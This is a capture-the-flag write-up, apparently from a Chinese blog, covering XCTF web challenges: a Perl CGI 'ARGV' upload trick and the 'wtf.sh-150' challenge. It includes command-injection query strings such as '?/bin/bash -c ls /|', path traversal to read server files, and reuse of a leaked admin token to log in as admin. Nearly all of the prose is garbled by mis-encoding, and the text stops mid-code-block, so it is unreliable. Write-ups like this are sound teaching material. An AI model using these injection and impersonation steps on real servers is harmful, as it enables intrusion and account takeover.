</h2><p>ËøõÂÖ•Âú∫ÊôØÂêéÊúâ3‰∏™ÈìæÊé•ÔºåÁÇπËøõÂéªÈÉΩÊòØ.plÊñá‰ª∂Ôºå.plÊñá‰ª∂ÈÉΩÊòØÁî®perlÁºñÂÜôÁöÑÁΩëÈ°µÊñá‰ª∂„ÄÇ</p>
<p>Â∞ùËØïÂêéÂèëÁé∞ÔºåFilesÈìæÊé•ÂèØ‰ª•‰∏ä‰º†Êñá‰ª∂Âπ∂ÊääÊñá‰ª∂ÂÜÖÂÆπÊâìÂç∞Âá∫Êù•„ÄÇÁåúÊÉ≥ÂêéÂè∞Â∫îËØ•Áî®‰∫Üparam()ÂáΩÊï∞„ÄÇ</p>
<p><strong>param()ÂáΩÊï∞‰ºöËøîÂõû‰∏Ä‰∏™ÂàóË°®ÁöÑÊñá‰ª∂‰ΩÜÊòØÂè™ÊúâÁ¨¨‰∏Ä‰∏™Êñá‰ª∂‰ºöË¢´ÊîæÂÖ•Âà∞‰∏ãÈù¢ÁöÑÊé•Êî∂ÂèòÈáè‰∏≠„ÄÇÂ¶ÇÊûúÊàë‰ª¨‰º†ÂÖ•‰∏Ä‰∏™ARGVÁöÑÊñá‰ª∂ÔºåÈÇ£‰πàPerl‰ºöÂ∞Ü‰º†ÂÖ•ÁöÑÂèÇÊï∞‰Ωú‰∏∫Êñá‰ª∂ÂêçËØªÂá∫Êù•„ÄÇÂØπÊ≠£Â∏∏ÁöÑ‰∏ä‰º†Êñá‰ª∂ËøõË°å‰øÆÊîπ,ÂèØ‰ª•ËææÂà∞ËØªÂèñ‰ªªÊÑèÊñá‰ª∂ÁöÑÁõÆÁöÑ„ÄÇ</strong></p>
<p>Ê∫êÁ†ÅÂ§ßÊ¶ÇÊòØËøôÊ†∑</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">use</span> <span class="n">strict</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="n">use</span> <span class="n">warnings</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl"><span class="n">use</span> <span class="n">CGI</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="n">my</span> <span class="o">$</span><span class="n">cgi</span><span class="o">=</span> <span class="n">CGI</span><span class="o">-&gt;</span><span class="n">new</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="o">$</span><span class="n">cgi</span><span class="o">-&gt;</span><span class="n">upload</span><span class="p">(</span> <span class="s1">&#39;file&#39;</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="n">my</span> <span class="o">$</span><span class="n">file</span><span class="o">=</span> <span class="o">$</span><span class="n">cgi</span><span class="o">-&gt;</span><span class="n">param</span><span class="p">(</span> <span class="s1">&#39;file&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">     <span class="k">while</span> <span class="p">(</span> <span class="o">&lt;$</span><span class="n">file</span><span class="o">&gt;</span> <span class="p">)</span> <span class="p">{</span> <span class="nb">print</span> <span class="s2">&#34;$_&#34;</span><span class="p">;</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>bpÈöè‰æø‰∏ä‰º†Êñá‰ª∂ÊäìÂåÖÂÖàÂ§çÂà∂boundaryÂàÜÂâ≤Á∫ø</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250201190445635.png"
	width="887"
	height="200"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250201190445635_hu4718707887780812707.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250201190445635_hu4677642020493025871.png 1024w"
	loading="lazy"
	
		alt="image-20250201190445635"
	
	
		class="gallery-image" 
		data-flex-grow="443"
		data-flex-basis="1064px"
	
></p>
<p>ÊääÊñá‰ª∂ÂêçfilenameÂà†Èô§</p>
<p>‰∏ä‰º†ARGV</p>
<p>ÁÑ∂ÂêéÂú®urlÂêéÈù¢ÊãºÊé•‰ªñÁöÑÊú¨Âú∞Êñá‰ª∂</p>
<p>ËøôÈáåÁî®bin/bashÊù•ÊâßË°åÂëΩ‰ª§</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?/bin/bash -c ls /|
</span></span><span class="line"><span class="cl">ËΩ¨Á†ÅÂêé?/bin/bash%20-c%20ls${IFS}/|
</span></span><span class="line"><span class="cl">ÊàñËÄÖ
</span></span><span class="line"><span class="cl">Áî®?ls -l / |
</span></span><span class="line"><span class="cl">ËΩ¨Á†ÅÂêé?ls%20-l%20/%20|
</span></span></code></pre></td></tr></table>
</div>
</div><p>/bin/bash ‰∏ÄÊó¶Ë¢´ËÆøÈóÆËæìÂá∫ÔºåÂ∞±ÊòØbashËøêË°åÁéØÂ¢ÉÔºåÊï¥‰∏™ËØ≠Âè•ÁöÑËæìÂá∫ÁªìÊûúÂú®shellÁöÑÁºìÂÜ≤Âå∫ÈáåÔºå‰πüÂ∞±ÊòØÂêéÂè∞ÊúçÂä°Âô®ÊâçËÉΩÁúãÂà∞ÔºåÂπ∂‰∏ç‰ºöËæìÂá∫Âà∞htmlÊ†áÁ≠æ‰∏≠„ÄÇÂú®linuxÈáåÊàë‰ª¨Âè™ÈúÄË¶ÅÁÆ°ÈÅìÊìç‰ΩúÂ∞±ÂèØ‰ª•ÊåáÂÆöÁªìÊûúÁöÑÂ≠òÊîæ‰ΩçÁΩÆ‰∫Ü„ÄÇ
<strong>TipsÔºöPerl open()ÂáΩÊï∞‰ºöÈªòËÆ§ÊâìÂºÄ‰∏Ä‰∏™ÁÆ°ÈÅìÔºÅ</strong>
ËøôÈáåÂà©Áî®Perl open()ÂáΩÊï∞ÊâìÂºÄÁöÑÁÆ°ÈÅìÔºåËøõË°åÂä´ÊåÅÔºåÈÄöËøá‚Äú|‚ÄúÊìç‰ΩúÁ¨¶ÔºåÊääÂÜÖÂÆπÂºïÂÖ•open()ÂáΩÊï∞Â∑≤ÁªèÊâìÂºÄÁöÑÁÆ°ÈÅì‰∏≠ÔºåÂ∞±ÂèØ‰ª•ËæìÂá∫Âà∞htmlÊ†áÁ≠æ‰∏≠</p>
<p>Â¶ÇÊûú‰∏çÊãºÊé•ÁÆ°ÈÅìÁ¨¶ÊòØ‰∏ç‰ºöÂõûÊòæÁöÑÔºåËÄå‰∏îls /‰∏≠Èó¥ÁöÑÁ©∫Ê†ºË¶ÅÁî®linuxÁöÑÁ©∫Ê†ºÊõø‰ª£ÔºåËÄå‰∏çÊòØ%20ËøôÁßçurlÁºñÁ†Å</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250201191129662.png"
	width="1848"
	height="681"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250201191129662_hu17323660611933119168.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250201191129662_hu1666371653358939930.png 1024w"
	loading="lazy"
	
		alt="image-20250201191129662"
	
	
		class="gallery-image" 
		data-flex-grow="271"
		data-flex-basis="651px"
	
></p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250201191145264.png"
	width="1865"
	height="725"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250201191145264_hu3862563211647843805.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250201191145264_hu18176634486710893055.png 1024w"
	loading="lazy"
	
		alt="image-20250201191145264"
	
	
		class="gallery-image" 
		data-flex-grow="257"
		data-flex-basis="617px"
	
></p>
<p>Áé∞Âú®Ëß£Èáä‰∏ä‰º†ARGVËÉΩËØªÂèñ‰ªªÊÑèÊñá‰ª∂ÁöÑÂéüÁêÜ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="o">$</span><span class="n">cgi</span><span class="o">-&gt;</span><span class="n">upload</span><span class="p">(</span> <span class="s1">&#39;file&#39;</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="n">my</span> <span class="o">$</span><span class="n">file</span><span class="o">=</span> <span class="o">$</span><span class="n">cgi</span><span class="o">-&gt;</span><span class="n">param</span><span class="p">(</span> <span class="s1">&#39;file&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">     <span class="k">while</span> <span class="p">(</span> <span class="o">&lt;$</span><span class="n">file</span><span class="o">&gt;</span> <span class="p">)</span> <span class="p">{</span> <span class="nb">print</span> <span class="s2">&#34;$_&#34;</span><span class="p">;</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>‰∏äÈù¢ËøôÊÆµ‰ª£Á†ÅÊúâÊºèÊ¥û</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">È¶ñÂÖàÔºå„Äê</span><span class="k">if</span> <span class="p">(</span><span class="o">$</span><span class="n">cgi</span><span class="o">-&gt;</span><span class="n">upload</span><span class="p">(</span><span class="s1">&#39;file&#39;</span><span class="p">))</span> <span class="p">{</span><span class="err">„ÄëËøôË°å‰ª£Á†Å‰∏≠ÔºåÊàë‰ª¨ÊúüÊúõ</span><span class="n">upload</span><span class="p">()</span><span class="err">Ë¥üË¥£Ê£ÄÊü•‚Äú</span><span class="n">file</span><span class="err">‚ÄùÂèÇÊï∞ÂÄºÊâÄ‰ª£Ë°®ÁöÑÊñá‰ª∂ÊòØÂê¶Â∑≤‰∏ä‰º†ÔºåÁÑ∂ËÄåÂÆûÈôÖ‰∏ä</span><span class="n">upload</span><span class="p">()</span><span class="err">Ê£ÄÊü•ÁöÑÊòØÊüê‰∏Ä‚Äú</span><span class="n">file</span><span class="err">‚ÄùÂèÇÊï∞ÂÄºÊâÄ‰ª£Ë°®ÁöÑÊñá‰ª∂ÊòØÂê¶Â∑≤‰∏ä‰º†ÔºàÁî®Êà∑ÂèØÊûÑÈÄ†Â§ö‰∏™</span><span class="n">fileÂèÇÊï∞</span><span class="err">Ôºâ„ÄÇÊç¢Âè•ËØùËØ¥Ôºå</span><span class="n">upload</span><span class="p">()</span><span class="err">Âπ∂‰∏çË¶ÅÊ±ÇÊâÄÊúâÁöÑ</span><span class="n">fileÂèÇÊï∞ÈÉΩÊòØÊñá‰ª∂</span><span class="err">ÔºåÂÆÉÂè™Ë¶ÅÊ±ÇÂÖ∂‰∏≠‰∏Ä‰∏™</span><span class="n">fileÂèÇÊï∞ÊòØÊñá‰ª∂Âç≥ÂèØ</span><span class="err">„ÄÇËøôÊÑèÂë≥ÁùÄÔºåÊàë‰ª¨ÂèØ‰ª•ÊûÑÈÄ†</span><span class="mi">2</span><span class="err">‰∏™</span><span class="n">fileÂèÇÊï∞</span><span class="err">Ôºå‰∏Ä‰∏™‰∏ä‰º†Êñá‰ª∂ÔºåÂè¶‰∏Ä‰∏™Ëµã‰∏Ä‰∏™ÂèòÈáèÂÄºÔºåËøôÊ†∑‰πüÂèØ‰ª•ÈÄöËøá</span><span class="n">upload</span><span class="p">()</span><span class="err">ÁöÑÊ†°È™å„ÄÇ</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">ÁÑ∂ÂêéÔºå„Äê</span><span class="n">my</span> <span class="n">file</span><span class="o">=</span><span class="n">cgi</span><span class="o">-&gt;</span><span class="n">param</span><span class="p">(</span><span class="s1">&#39;file&#39;</span><span class="p">);</span><span class="err">„ÄëËøôË°å‰ª£Á†Å‰∏≠ÔºåÊàë‰ª¨ÊúüÊúõ</span><span class="n">param</span><span class="p">()</span><span class="err">ËøîÂõû‰∏ä‰º†Êñá‰ª∂ÁöÑÊñá‰ª∂ÊèèËø∞Á¨¶ÔºåÁÑ∂ËÄåÂÆûÈôÖ‰∏äÔºåÂ¶ÇÊûúÊàë‰ª¨ÊûÑÈÄ†</span><span class="mi">2</span><span class="err">‰∏™</span><span class="n">fileÂèÇÊï∞</span><span class="err">Ôºå‰∏Ä‰∏™‰∏ä‰º†Êñá‰ª∂ÔºåÂè¶‰∏Ä‰∏™Ëµã‰∏Ä‰∏™ÂèòÈáèÂÄº„ÄÇÈÇ£‰πà</span><span class="n">param</span><span class="p">()</span><span class="err">ËøîÂõûÊàë‰ª¨ËæìÂÖ•ÁöÑÊâÄÊúâ</span><span class="n">fileÂèÇÊï∞ÂÄºÁöÑÂàóË°®</span><span class="err">„ÄÇ‰ΩÜÊòØ</span><span class="n">file‰∏çËÉΩÂåÖÂê´‰∏§‰∏™ÂÄº</span><span class="err">ÔºåÊâÄ‰ª•Âú®Áªô</span><span class="n">fileËµãÂÄºÊó∂</span><span class="err">ÔºåÁ®ãÂ∫è‰ºöÂèñÂàóË°®‰∏≠ÁöÑÁ¨¨‰∏Ä‰∏™ÂÄºËµãÁªô</span><span class="n">file</span><span class="err">„ÄÇÊâÄ‰ª•Â¶ÇÊûúÁªôÁ¨¨‰∏Ä‰∏™</span><span class="n">fileÂèÇÊï∞ËµãÂèòÈáèÂÄº</span><span class="err">ÔºåÁ¨¨‰∫å‰∏™</span><span class="n">fileÂèÇÊï∞ËµãÊñá‰ª∂ÊèèËø∞Á¨¶</span><span class="err">ÔºåÂàô</span><span class="n">file‰ºöË¢´ËµãÂÄº‰∏∫Êàë‰ª¨ËæìÂÖ•ÁöÑÂèòÈáèÂÄº</span><span class="err">ÔºåËÄå‰∏çÊòØ‰∏ä‰º†ÁöÑÊñá‰ª∂ÊèèËø∞Á¨¶„ÄÇËøôÊÑèÂë≥ÁùÄÔºåÊ≠§Êó∂</span><span class="o">$</span><span class="n">fileÂèòÊàê‰∫Ü‰∏Ä‰∏™Â∏∏ËßÑÂ≠óÁ¨¶‰∏≤</span><span class="err">ÔºÅ</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">Êé•ÁùÄÔºå„Äê</span><span class="k">while</span> <span class="p">(</span><span class="o">&lt;$</span><span class="n">file</span><span class="o">&gt;</span><span class="p">)</span> <span class="p">{</span><span class="err">„ÄëËøôË°å‰ª£Á†Å‰∏≠ÔºåÊàë‰ª¨Êú¨Êù•ÊúüÊúõÈÅçÂéÜÊñá‰ª∂ÁöÑÊØè‰∏ÄË°åÔºå‰ΩÜÁî±‰∫éÊ≠§Êó∂</span><span class="o">$</span><span class="n">fileÊòØ‰∏Ä‰∏™Â∏∏ËßÑÂ≠óÁ¨¶‰∏≤</span><span class="err">Ôºå‰∫ãÂÆû‰∏äÔºå‚Äú</span><span class="o">&lt;&gt;</span><span class="err">‚Äù‰ªÖÂØπÊñá‰ª∂Ëµ∑‰ΩúÁî®ÔºåÂØπÂ≠óÁ¨¶‰∏≤‰∏çËµ∑‰ΩúÁî®„ÄÇ‰ΩÜÊòØÊúâ‰∏Ä‰∏™Áâπ‰æãÔºåÈô§ÈùûËøô‰∏™Â≠óÁ¨¶‰∏≤ÊòØ‚Äú</span><span class="n">ARGV</span><span class="err">‚Äù„ÄÇÂΩìÂ≠óÁ¨¶‰∏≤ÊòØ‚Äú</span><span class="n">ARGV</span><span class="err">‚ÄùÊó∂Ôºå‚Äú</span><span class="o">&lt;&gt;</span><span class="err">‚Äù‰ºöÈÅçÂéÜ</span><span class="n">URL‰∏≠</span><span class="err">ÔºüÂêéÈù¢ÁöÑÊØè‰∏™ÂÄºÔºàÊØîÂ¶Ç</span><span class="n">POST</span> <span class="o">/</span><span class="n">test</span><span class="o">.</span><span class="n">cgi</span><span class="err">?</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">file1</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">file2</span><span class="err">ÔºâÔºåÂπ∂ÊääÂÆÉ‰ª¨ÂΩìÂÅöÊñá‰ª∂Ë∑ØÂæÑÊèíÂÖ•Âà∞‰∏Ä‰∏™</span><span class="n">open</span><span class="p">()</span><span class="err">Ë∞ÉÁî®‰∏≠„ÄÇËøôÊÑèÂë≥ÁùÄÔºåÊ≠§Êó∂Êàë‰ª¨ÂèØ‰ª•Êü•Áúã‰ªª‰ΩïÊàë‰ª¨ÊÉ≥ÁúãÁöÑÊñá‰ª∂ÂÜÖÂÆπÔºåËÄå‰∏çÊòØ‰ªÖ‰ªÖÊü•ÁúãÊàë‰ª¨‰∏ä‰º†ÁöÑÊñá‰ª∂ÂÜÖÂÆπ„ÄÇ</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">ÊúÄÂêéÔºåÂÜçËØ¥ËØ¥</span><span class="n">open</span><span class="p">()</span><span class="err">ÂáΩÊï∞„ÄÇ</span><span class="n">open</span><span class="p">()</span><span class="err">ÁöÑÊú¨ÊÑèÊòØÊâìÂºÄ‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤ÊâÄ‰ª£Ë°®ÁöÑÊñá‰ª∂Ôºå‰ΩÜÊòØÂΩìÂú®Â≠óÁ¨¶‰∏≤ÂêéÈù¢Âä†‰∏Ä‰∏™‚Äú</span><span class="o">|</span><span class="err">‚ÄùÁöÑËØùÔºå</span><span class="n">open</span><span class="p">()</span><span class="err">Â∞±‰ºöÊâßË°åËøô‰∏™Â≠óÁ¨¶‰∏≤ÔºàÊØîÂ¶Ç</span><span class="n">POST</span> <span class="o">/</span><span class="n">test</span><span class="o">.</span><span class="n">cgi</span><span class="err">?</span><span class="n">ipconfig</span><span class="o">|</span><span class="err">ÔºâÔºåÂ∞±ÂÉèË∞ÉÁî®‰∏Ä‰∏™</span><span class="n">exec</span><span class="p">()</span><span class="err">‰∏ÄÊ†∑„ÄÇ</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Êé•ÁùÄARGV</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ARGVÔºöÈÅçÂéÜÊï∞ÁªÑÂèòÈáè@ARGV‰∏≠ÊâÄÊúâÊñá‰ª∂ÂêçÁöÑÁâπÊÆäÊñá‰ª∂Âè•ÊüÑ
</span></span><span class="line"><span class="cl">@ARGVÔºöÊòØ‰∏™ÂÖ®Â±ÄÊï∞ÁªÑÁâπÊÆäÂèòÈáèÔºå‰º†ÁªôËÑöÊú¨ÁöÑÂëΩ‰ª§Ë°åÂèÇÊï∞ÂàóË°®
</span></span><span class="line"><span class="cl">Perl ‰ºöÂ∞ÜperlÂëΩ‰ª§Ë°åÂèÇÊï∞ÂàóË°®ÊîæÂÖ•Âà∞Êï∞ÁªÑ@ARGV‰∏≠ÔºåËÄåÈªòËÆ§ÊÉÖÂÜµ‰∏ãÔºåËøô‰∫õÂëΩ‰ª§Ë°åÂèÇÊï∞ÊòØPerlÁöÑÊï∞ÊçÆËæìÂÖ•Ê∫êÔºå‰πüÂ∞±ÊòØËØ¥Perl ‰ºö‰ª•‰æùÊ¨°Â∞Ü‰ªñ‰ª¨ÂΩì‰ΩúÊñá‰ª∂ËøõË°åËØªÂèñ„ÄÇËøôÈáåÂèØ‰ª•ÂèÇËÄÉCËØ≠Ë®ÄÁöÑargv{}Êï∞ÁªÑÔºå‰ΩÜ‰∏çÂêåÁöÑÊòØÔºå
</span></span><span class="line"><span class="cl">PerlËØ≠Ë®ÄÁöÑ@ARGV‰∏≠ÁöÑÁ¨¨‰∏Ä‰∏™ÂèòÈáèÂ∞±ÊòØÂèÇÊï∞ÔºåËÄå‰∏çÊòØÊñá‰ª∂Âêç„ÄÇ
</span></span><span class="line"><span class="cl">Param() ÂáΩÊï∞‰ºöËøîÂõû‰∏Ä‰∏™ÂàóË°®Ôºå‰ΩÜÂè™ÊúâÁ¨¨‰∏Ä‰∏™Êñá‰ª∂‰ºöË¢´ÊîæÂà∞ÂèòÈáè‰∏≠„ÄÇ
</span></span><span class="line"><span class="cl">Â¢ûÂä†Êñ∞ÁöÑ‰∏ä‰º†È°πÔºåÂπ∂Âà†Èô§filenameÔºåÈáçÂ§ßÊºèÊ¥ûÊù•‰∫Ü
</span></span><span class="line"><span class="cl">Âà†Èô§filenameÂêéÔºå $fileÁöÑÂÄºÔºà‰πüÂ∞±ÊòØÊñá‰ª∂ÂêçÔºâÂèò‰∏∫‰∫Ü‰∏ä‰º†ÁöÑÂÜÖÂÆπÔºåËÄåËæìÂá∫ÁöÑÊñá‰ª∂ÂÜÖÂÆπ‰∏∫Á©∫
</span></span><span class="line"><span class="cl">ÈÄö‰øóÁêÜËß£Â∞±ÊòØÔºåÊñ∞Âä†ÂÖ•ÁöÑÊñá‰ª∂ÂÜÖÂÆπÊõøÊç¢‰∫ÜfilenameÂèÇÊï∞Ôºå‰º†Áªô‰∫Ü$fileÂèòÈáèÔºå&lt;file&gt;Âè•ÊüÑ‰∏≠ÊâìÂºÄÊñá‰ª∂ÂÜÖÂÆπ‰∏∫Á©∫
</span></span><span class="line"><span class="cl">ÈÇ£Â¶ÇÊûúÊàë‰ª¨Âà©Áî®@ARGVÔºåÂ∞Ü$fileÊõøÊç¢‰∏∫@ARGVÔºåÂÖ∂Âè•ÊüÑÂ∞±ÊòØÔºåÂ∞±ÊòØÂëΩ‰ª§Ë°åÁöÑÂèÇÊï∞ÂëÄÔºåÂ¶ÇÊûúÁªôÁöÑÂèÇÊï∞ÊòØÊñá‰ª∂ÂêçÔºåÂ∞±ÂèØ‰ª•ËæìÂá∫Á¨¨‰∏Ä‰∏™Êñá‰ª∂ÂêçÁöÑÊâÄÊúâÂÜÖÂÆπ„ÄÇ
</span></span><span class="line"><span class="cl">ËøôÈáåÊàë‰ª¨Âà©Áî®‰ª•‰∏ä‰ø°ÊÅØÊûÑÈÄ†ÔºåÂä†ÂÖ•Êñ∞ÁöÑÊñá‰ª∂ÂàóË°®ÔºåÂà†Èô§filenameÔºåÊñá‰ª∂ÂÜÖÂÆπÂÜôÂÖ•ARGV
</span></span><span class="line"><span class="cl">ÈÇ£‰πàÂêéÁ´ØÊâßË°åÔºåÂ∞±‰ºöÊää$fileÁöÑÂÄºÊç¢‰∏∫ARGVÔºå‰πüÂ∞±Êàê‰∫Ü‰∏äËø∞test.plÁöÑÂÜÖÂÆπÔºå‰ºöÊää‰ªéÂëΩ‰ª§Ë°åÈáåËØªÂèñÂà∞ÁöÑÂèÇÊï∞ÔºåÂΩì‰ΩúÊñá‰ª∂Ë∑ØÂæÑÊâæÂà∞Âπ∂ËæìÂá∫„ÄÇ
</span></span><span class="line"><span class="cl">ÈÇ£‰πàÂ¶Ç‰Ωï‰º†ÂÖ•ÂëΩ‰ª§Ë°åÂèÇÊï∞Âë¢ÔºüÂÖ∂ÂÆûÁõ¥Êé•Âú®urlÁªôÂá∫ÂèÇÊï∞Â∞±Áõ∏ÂΩì‰∫éÂëΩ‰ª§Ë°å‰º†ÂèÇ
</span></span><span class="line"><span class="cl">ÈÇ£‰πàÔºåÈÄöËøáARGVÂíåurlÁöÑÂèÇÊï∞Â∞±ÂèØ‰ª•ËææÂà∞ËØªÂèñÊúçÂä°Âô®‰∏ä‰ªªÊÑèÊñá‰ª∂ÁöÑÁõÆÁöÑ
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="wtfsh-150">wtf.sh-150
</h2><p>Ê≥®ÂÜåÂíåÁôªÂÖ•ÁïåÈù¢Â∞ùËØïsqlÊ≥®ÂÖ•Ê≤°ÁªìÊûú</p>
<p>ÁÑ∂ÂêéÊ≥®ÂÜåÂêéÁÇπÂáª‰ªªÊÑèÁïåÈù¢ÂèëÁé∞ÊúâÂèÇÊï∞</p>
<p>ÂÜçÊ¨°Â∞ùËØïsqlÊ≥®ÂÖ•Ê≤°ÁªìÊûúÔºåËØïËØïÁõÆÂΩïÁ©øË∂ä../</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250201210204271.png"
	width="1518"
	height="751"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250201210204271_hu6980279970834769637.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250201210204271_hu2179147815055872850.png 1024w"
	loading="lazy"
	
		alt="image-20250201210204271"
	
	
		class="gallery-image" 
		data-flex-grow="202"
		data-flex-basis="485px"
	
></p>
<p>Êü•Êâæflag</p>
<p>ÂèëÁé∞ËøôÊÆµÊ∫êÁ†Å</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ if is_logged_in &amp;&amp; [[ &#34;${COOKIES[&#39;USERNAME&#39;]}&#34; = &#39;admin&#39; ]] &amp;&amp; [[ ${username} = &#39;admin&#39; ]] $ then $ get_flag1 $ fi $ fi 
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ë¶ÅÊòØcookie‰∏≠ÁöÑUSERNAMEÁöÑÂÄº‰∏∫adminÔºåËÄå‰∏îusername‰∏∫adminÂ∞±ËÉΩÊãøÂà∞flag1</p>
<p>‰ΩÜÊòØÊàë‰ª¨Ê≤°ÊúâadminÁöÑÂØÜÁ†ÅÊàñËÄÖadminÁöÑtoken</p>
<p>ÁïåÈù¢ÈáåÈù¢ÊúâÂæàÂ§öusersÁõÆÂΩï</p>
<p>Êàë‰ª¨ÁªßÁª≠ÁõÆÂΩïÁ©øË∂ä</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250201210924691.png"
	width="1343"
	height="844"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250201210924691_hu13889440891387385700.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250201210924691_hu58166542239181813.png 1024w"
	loading="lazy"
	
		alt="image-20250201210924691"
	
	
		class="gallery-image" 
		data-flex-grow="159"
		data-flex-basis="381px"
	
></p>
<p>ÊâæÂà∞adminÁöÑÁõ∏ÂÖ≥‰ø°ÊÅØ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> Posted by admin ae475a820a6b5ade1d2e8b427b59d53d15f1f715 uYpiNNf/X0/0xNfqmsuoKFEtRlQDwNbS2T6LdHDRWH5p3x4bL4sxN0RMg17KJhAmTMyr8Sem++fldP0scW7g3w== 
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøõbpÊäìÂåÖÁúãÁúã</p>
<p>ÂèëÁé∞Áé∞Âú®Ëøô‰∏≤Á°ÆÂÆûÊòØtoken</p>
<p>ÁÑ∂ÂêéÊàë‰ª¨‰º™ÈÄ†ÊàêadminÁôªÂÖ•</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250201213211522.png"
	width="1204"
	height="262"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250201213211522_hu16128628161817651013.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250201213211522_hu3008569343409741868.png 1024w"
	loading="lazy"
	
		alt="image-20250201213211522"
	
	
		class="gallery-image" 
		data-flex-grow="459"
		data-flex-basis="1102px"
	
></p>
<p>Âú®Áî®Êà∑ÁÆÄ‰ªãÂèëÁé∞‰∏ÄÂçäflag</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250201213247661.png"
	width="1579"
	height="958"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250201213247661_hu14423475316871042629.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250201213247661_hu13274768891131790801.png 1024w"
	loading="lazy"
	
		alt="image-20250201213247661"
	
	
		class="gallery-image" 
		data-flex-grow="164"
		data-flex-basis="395px"
	
></p>
<p>xctf{cb49256d1ab48803</p>
<p>Êé•ÁùÄ‰ªéÁïåÈù¢Ê∫êÁ†ÅÁªßÁª≠Êâæ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
